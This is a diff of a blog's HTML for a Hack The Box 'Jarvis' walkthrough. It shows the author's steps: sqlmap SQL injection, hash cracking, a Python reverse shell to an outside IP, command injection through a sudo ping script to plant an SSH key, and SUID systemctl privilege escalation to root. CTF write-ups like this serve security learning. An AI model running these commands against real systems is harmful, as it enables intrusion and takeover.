@@ -111,7 +111,7 @@ homemade script and a SUID binary.</p>
 <h1 id="recon">Recon</h1>
 <p>Let us start as always by a <code>nmap</code> scan the ports 22 (SSH), 80 (HTTP) and 64999
 are open:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>nmap -p- 10.10.10.143</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nmap -p- 10.10.10.143</span>
 <span class="code-line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:46 CEST</span>
 <span class="code-line">Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span>
 <span class="code-line">SYN Stealth Scan Timing: About 62.32% done; ETC: 13:48 (0:00:42 remaining)</span>
@@ -126,12 +126,12 @@ are open:</p>
 <span class="code-line">64999/tcp open  unknown</span>
 <span class="code-line"></span>
 <span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 101.63 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Let us see what services are running on this ports (especially the last one). It
 a simple HTTP service.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>nmap -p 22,80,64999 -sSV 10.10.10.143</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>nmap -p 22,80,64999 -sSV 10.10.10.143</span>
 <span class="code-line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-03 13:51 CEST</span>
 <span class="code-line">Nmap scan report for 10.10.10.143</span>
 <span class="code-line">Host is up (0.088s latency).</span>
@@ -144,16 +144,16 @@ a simple HTTP service.</p>
 <span class="code-line"></span>
 <span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
 <span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="web">Web</h1>
 <h2 id="on-port-64999">On port 64999</h2>
 <p>The page on the web service on port 64999 is only saying that we have been
 banned for 90 seconds.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>curl http://10.10.10.143:64999/</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>curl http://10.10.10.143:64999/</span>
 <span class="code-line">Hey you have been banned for 90 seconds, don&#39;t be bad</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="on-port-80">On port 80</h2>
@@ -170,7 +170,7 @@ SQL injection.</p>
 <p><img alt="Jarvis room id 5-1" src="/media/2019.10/jarvis_4.png"></p>
 <h1 id="getting-user">Getting user</h1>
 <p>We launch <code>sqlmap</code> against the page, it confirm the SQL injection:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sqlmap -u http://10.10.10.143/room.php?cod=5-1</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1</span>
 <span class="code-line">&lt;SNIP&gt;</span>
 <span class="code-line">GET parameter &#39;cod&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:</span>
 <span class="code-line">---</span>
@@ -190,7 +190,7 @@ SQL injection.</p>
 <span class="code-line">web server operating system: Linux Debian 9.0 (stretch)</span>
 <span class="code-line">web application technology: PHP, Apache 2.4.25</span>
 <span class="code-line">back-end DBMS: MySQL &gt;= 5.0.12</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We list the available database:</p>
@@ -201,17 +201,17 @@ SQL injection.</p>
 <li>performance_schema</li>
 </ul>
 <p>The SQLmap command is the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sqlmap -u http://10.10.10.143/room.php?cod=5-1 --dbs</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1 --dbs</span>
 <span class="code-line">available databases [4]:</span>
 <span class="code-line">[*] hotel</span>
 <span class="code-line">[*] information_schema</span>
 <span class="code-line">[*] mysql</span>
 <span class="code-line">[*] performance_schema</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We list the table for the <code>hotel</code> database and dump it, nothing interesting.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --tables</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D hotel --tables</span>
 <span class="code-line">Database: hotel</span>
 <span class="code-line">[1 table]</span>
 <span class="code-line">+------+</span>
@@ -223,32 +223,32 @@ SQL injection.</p>
 <span class="code-line">Table: room</span>
 <span class="code-line">[6 entries]</span>
 <span class="code-line">&lt;SNIP&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We dump the mysqluser table and crack the password hash (with the sqlmap
 cracking function):</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D mysql -T user --dump</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  -D mysql -T user --dump</span>
 <span class="code-line">Database: mysql</span>
 <span class="code-line">Table: user</span>
 <span class="code-line">[1 entry]</span>
 <span class="code-line">*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 (imissyou)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can then connect to the phpmyadmin as DBadmin:</p>
 <p><img alt="Jarvis phpmyadmin" src="/media/2019.10/jarvis_5.png"></p>
 <p>This does not give us a shell. Let us try something different: the <code>--os-shell</code>
 option from <code>sqlmap</code>. We got a shell!</p>
-<div class="highlight"><pre><span class="code-line"><span></span>sqlmap -u http://10.10.10.143/room.php?cod=5-1  --os-shell</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>sqlmap -u http://10.10.10.143/room.php?cod=5-1  --os-shell</span>
 <span class="code-line">os-shell&gt; id</span>
 <span class="code-line">command standard output: &#39;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#39;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We start enumeration a bit and found that we can call a binary as the pepper
 user with <code>sudo</code>.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>os-shell&gt; ls /home/</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>os-shell&gt; ls /home/</span>
 <span class="code-line">command standard output: &#39;pepper&#39;</span>
 <span class="code-line">os-shell&gt; ls /home/pepper/</span>
 <span class="code-line">command standard output:</span>
@@ -281,11 +281,11 @@ user with <code>sudo</code>.</p>
 <span class="code-line">User www-data may run the following commands on jarvis:</span>
 <span class="code-line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span>
 <span class="code-line">---</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>In oder to have a better shell, we use a python reverseshell:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>export RHOST=&quot;10.10.15.31&quot;;export RPORT=4444;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>export RHOST=&quot;10.10.15.31&quot;;export RPORT=4444;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 <span class="code-line"></span>
 <span class="code-line">$ sudo -l</span>
 <span class="code-line">Matching Defaults entries for www-data on jarvis:</span>
@@ -295,11 +295,11 @@ user with <code>sudo</code>.</p>
 <span class="code-line">User www-data may run the following commands on jarvis:</span>
 <span class="code-line">    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py</span>
 <span class="code-line">$ sudo -u pepper /var/www/Admin-Utilities/simpler.py</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The <code>simpler.py</code> script is the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="ch">#!/usr/bin/env python3</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/env python3</span></span>
 <span class="code-line"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span></span>
 <span class="code-line"><span class="kn">import</span> <span class="nn">sys</span></span>
 <span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
@@ -447,7 +447,7 @@ user with <code>sudo</code>.</p>
 <span class="code-line">    <span class="k">else</span><span class="p">:</span></span>
 <span class="code-line">        <span class="n">show_help</span><span class="p">()</span></span>
 <span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We notice the <code>exec_ping</code> function calling <code>os.system()</code>. As there is forbidden
@@ -456,30 +456,30 @@ Nevertheless we can try to ping the result of a command with the following
 <code>$(&lt;command&gt;)</code>.
 We mount a python web server with our ssh public key renamed <code>authorized\_keys</code> and
 download it from the box:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>Enter an IP: $(wget 10.10.15.31:8080/authorized_keys)</span>
-</pre></div>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Enter an IP: $(wget 10.10.15.31:8080/authorized_keys)</span>
+<span class="code-line"></code></pre></div>
 
 
 <p>We then create the <code>.ssh</code> folder in pepper home and move the key:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>Enter an IP: $(mkdir /home/pepper/.ssh)</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Enter an IP: $(mkdir /home/pepper/.ssh)</span>
 <span class="code-line">Enter an IP: $(mv authorized_keys /home/pepper/.ssh/)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can then connect to the box with ssh and get the user flag:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>ssh -lpepper 10.10.10.143</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh -lpepper 10.10.10.143</span>
 <span class="code-line">Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64</span>
 <span class="code-line">&lt;SNIP&gt;</span>
 <span class="code-line">Last login: Thu Oct  3 09:38:52 2019 from 10.10.15.31</span>
 <span class="code-line">pepper@jarvis:~$ cat user.txt </span>
 <span class="code-line">2afa36&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="lets-get-root">Let's get root</h1>
 <p>We enumerate the box as always.
 We found that the systemctl binary is SUID.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
 <span class="code-line">/bin/fusermount</span>
 <span class="code-line">/bin/mount</span>
 <span class="code-line">/bin/ping</span>
@@ -495,47 +495,47 @@ We found that the systemctl binary is SUID.</p>
 <span class="code-line">/usr/lib/eject/dmcrypt-get-device</span>
 <span class="code-line">/usr/lib/openssh/ssh-keysign</span>
 <span class="code-line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p><a href="https://gtfobins.github.io/gtfobins/systemctl/#suid">GTFOBins</a> show how
 to exploit that misconfiguration.
 First we create a temporary file:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ TF=$(mktemp).service</span>
-</pre></div>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ TF=$(mktemp).service</span>
+<span class="code-line"></code></pre></div>
 
 
 <p>We write a service file inside. This service run the command <code>id</code> and put the
 result in a file:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ echo &#39;[Service]</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ echo &#39;[Service]</span>
 <span class="code-line">&gt; Type=oneshot</span>
 <span class="code-line">&gt; ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;</span>
 <span class="code-line">&gt; [Install]</span>
 <span class="code-line">&gt; WantedBy=multi-user.target&#39; &gt; $TF</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We link the service using sysemctl:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ /bin/systemctl link $TF</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ /bin/systemctl link $TF</span>
 <span class="code-line">Created symlink /etc/systemd/system/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We start the service using sysemctl:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ /bin/systemctl enable --now $TF</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ /bin/systemctl enable --now $TF</span>
 <span class="code-line">Created symlink /etc/systemd/system/multi-user.target.wants/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We get the result of the <code>id</code> command in <code>/tmp/output</code>.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ cat /tmp/output </span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ cat /tmp/output </span>
 <span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The command was executed. Now we create a second service which will output the
 root's flag:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>pepper@jarvis:~$ TF2=$(mktemp).service</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ TF2=$(mktemp).service</span>
 <span class="code-line">pepper@jarvis:~$ echo &#39;[Service]</span>
 <span class="code-line">&gt; Type=oneshot</span>
 <span class="code-line">&gt; ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;</span>
@@ -547,7 +547,7 @@ root's flag:</p>
 <span class="code-line">Created symlink /etc/systemd/system/multi-user.target.wants/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.</span>
 <span class="code-line">pepper@jarvis:~$ cat /tmp/output </span>
 <span class="code-line">d41d8&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="wrapping-up">Wrapping up</h1>
@@ -637,139 +637,52 @@ escalation let me learn new things about systemd.</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">cve</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/drupal.html">drupal</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/smb.html">smb</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/blog.html">blog</a>
@@ -778,40 +691,127 @@ escalation let me learn new things about systemd.</p>
               <a href="https://maggick.fr/tag/code-review.html">code review</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/windows.html">windows</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/waf.html">WAF</a>
             </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
             </li>
     </ul>
 </section>
